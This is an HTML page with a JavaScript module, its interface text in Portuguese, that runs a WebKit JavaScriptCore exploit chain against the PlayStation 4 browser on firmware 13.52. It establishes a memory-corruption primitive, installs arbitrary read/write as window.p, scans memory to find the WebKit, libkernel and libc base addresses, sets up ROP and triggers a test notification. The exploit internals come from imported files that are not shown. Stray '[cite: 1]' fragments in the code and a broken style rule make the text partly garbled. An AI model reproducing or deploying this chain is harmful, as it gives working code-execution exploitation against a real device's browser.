<style>

  border:1px solid #161825;border-radius:6px;overflow-y:auto;
  padding:8px 10px;font-size:11px;line-height:1.65;margin-bottom:8px}
.i{color:#5b9bd5}.ok{color:#00c853;font-weight:bold}.w{color:#f0a500}
.e{color:#ff5252;font-weight:bold}.d{color:#333}.a{color:#bd93f9}
.s{color:#00c8ff;border-top:1px solid #161825;margin-top:5px;

#cards{width:100%;max-width:720px;display:grid;

.card .cv{font-size:12px;color:#bd93f9}
.card .cv.na{color:#222}

/* constants output box */
#cbox{width:100%;max-width:720px;background:#03100a;border:2px solid #00c853;
  border-radius:6px;padding:12px;display:none;margin-bottom:8px;
  font-size:11px;line-height:1.6;color:#4ade80;white-space:pre-wrap;word-break:break-all}
#cbox .ct{color:#fff;font-weight:bold;margin-bottom:6px;
  border-bottom:1px solid #0a2a15;padding-bottom:4px}

<script type="module">
import { int64 }              from './resources/int64.js';
import { establishPrimitive } from './resources/core.js?v=10';
import { installWindowP }     from './mem.js';[cite: 1]
import { initRop, sendNotification } from './rop.js';
globalThis.int64 = int64;

const $con = document.getElementById('con');
const $dot = document.getElementById('dot');
const $st  = document.getElementById('st');
const $fw  = document.getElementById('fw');

function log(m, c='i') {
  const d = document.createElement('div');
  d.className = c; d.textContent = m;
  $con.appendChild(d);
  $con.scrollTop = $con.scrollHeight;
  while ($con.children.length > 600) $con.removeChild($con.firstChild);
}
function logH(m) { log('=== ' + m + ' ===', 's'); }
function setStatus(m, s='r') {
  $st.textContent = m; $dot.className = s;
}
function setCard(id, v) {
  const el = document.getElementById(id);
  if (!el) return;
  el.textContent = v; el.classList.remove('na');
}

async function resolveSafeStubs(p, webkitBase) {
  logH('RESOLUÇÃO SEGURA DE STUBS');
  let libKernelBase = null;
  let libcBase = null;

  try {
    for (let off = 0x3000000; off < 0x3900000; off += 8) {
      try {
        let ptr = p.read8(webkitBase.add32(off));
        let hi = ptr.hi;
        let alignedLow = ptr.low & ~0x3FFF;

        if (hi === 0x80 && !libKernelBase) {
          libKernelBase = new int64(alignedLow, hi);
          log(`[+] libkernel Base: 0x${libKernelBase.toString()}`, 'ok');
        } else if (hi >= 0x90 && hi <= 0x98 && !libcBase) {
          libcBase = new int64(alignedLow, hi);
          log(`[+] libc Base: 0x${libcBase.toString()}`, 'ok');
        }
      } catch (e) {}
      if (libKernelBase && libcBase) break;
    }
  } catch (err) {
    log('[-] Erro na resolução: ' + err.message, 'e');
  }

  return { libKernelBase, libcBase };
}

async function main() {
  const ua = navigator.userAgent;
  const fw = /PlayStation 4\/(\d+\.\d+)/.exec(ua);
  $fw.textContent = fw ? `PlayStation 4 — firmware ${fw[1]}` : `UA: ${ua.slice(0, 40)}`;
  log('UA: ' + ua, 'd');

  setStatus('Rodando exploit JSC (core.js)...', 'r');
  logH('EXPLOIT JSC (WebKit)');

  let carrier;
  try {
    carrier = await establishPrimitive({
      onEvent: (tag, detail, attempt) => {
        document.getElementById('ba').textContent = `tentativa: ${attempt || 1}`;
        document.getElementById('bg').textContent = `estágio: ${tag.toLowerCase()}`;
        log(`[${tag}] ${detail}`, 'i');
      },
      maxAttempts: 0
    });
  } catch (err) {
    setStatus('core.js falhou: ' + err.message, 'e');
    log('[ERRO] ' + err.message, 'e');
    return;
  }

  log('[+] core.js: exploit JSC concluído!', 'ok');
  setStatus('Instalando R/W arbitrário...', 'r');
  logH('INSTALANDO PRIMITIVA R/W (mem.js)');

  let p;
  try {
    p = installWindowP(carrier, {[cite: 1]
      promote: true,
      onEvent: (tag, detail) => {
        log(`  [mem/${tag}] ${detail}`, 'd');
      }
    });
  } catch (err) {
    setStatus('mem.js falhou: ' + err.message, 'e');
    log('[ERRO] ' + err.message, 'e');
    return;
  }

  log('[+] R/W arbitrário: window.p instalado com sucesso!', 'ok');
  setStatus('Mapeando bases...', 'r');
  logH('MAPEAMENTO DA 13.52');

  const ctor = globalThis.__ps5NativeCtor;
  if (typeof ctor === 'number' && ctor > 0x100000000) {
    const hi = Math.floor(ctor / 0x100000000);
    const lo = ctor - hi * 0x100000000;
    const ctorInt64 = new int64(lo >>> 0, hi >>> 0);

    const hc = (typeof OFFSET_wk_host_constructor_candidates !== 'undefined') 
               ? OFFSET_wk_host_constructor_candidates[0] 
               : 0x36F9E20;

    const resolvedBaseVal = ctor - hc;
    const baseHi = Math.floor(resolvedBaseVal / 0x100000000);
    const baseLo = resolvedBaseVal - baseHi * 0x100000000;
    const webkitBase = new int64(baseLo >>> 0, baseHi >>> 0);

    log('[+] WebKit Base calculada: 0x' + webkitBase.toString(), 'ok');
    setCard('c-wk', '0x' + webkitBase.toString());

    setTimeout(async () => {
      const bases = await resolveSafeStubs(p, webkitBase);
      
      if (bases.libKernelBase) setCard('c-lk', '0x' + bases.libKernelBase.toString());
      if (bases.libcBase) setCard('c-lc', '0x' + bases.libcBase.toString());

      initRop(webkitBase, bases.libKernelBase, bases.libcBase);
      
      try {
        const notif = sendNotification("Hello World from PS4 FW 13.52!");
        setCard('c-g', 'Pronto');
        setStatus('Notificação configurada com sucesso!', 'ok');
        log('✔ Buffer de notificação alocado e pronto para disparo.', 'ok');

        const cbox = document.getElementById('cbox');
        cbox.style.display = 'block';
        document.getElementById('c-out').textContent =
          `WebKit Base    = 0x${webkitBase.toString()}\n` +
          `libkernel Base = ${bases.libKernelBase ? '0x' + bases.libKernelBase.toString() : 'N/A'}\n` +
          `libSceLibc Base = ${bases.libcBase ? '0x' + bases.libcBase.toString() : 'N/A'}\n` +
          `Buffer Notif   = 0x${notif.requestBuffer.toString()}\n` +
          `Função Target  = 0x${notif.notifyFunc.toString()}`;
      } catch (err) {
        log('[-] Erro ao preparar notificação: ' + err.message, 'e');
      }
    }, 1000);

  } else {
    log('[-] Falha: __ps5NativeCtor não foi capturado corretamente.', 'e');
    setStatus('Erro ao capturar NativeCtor', 'e');
  }
}

main();
</script>
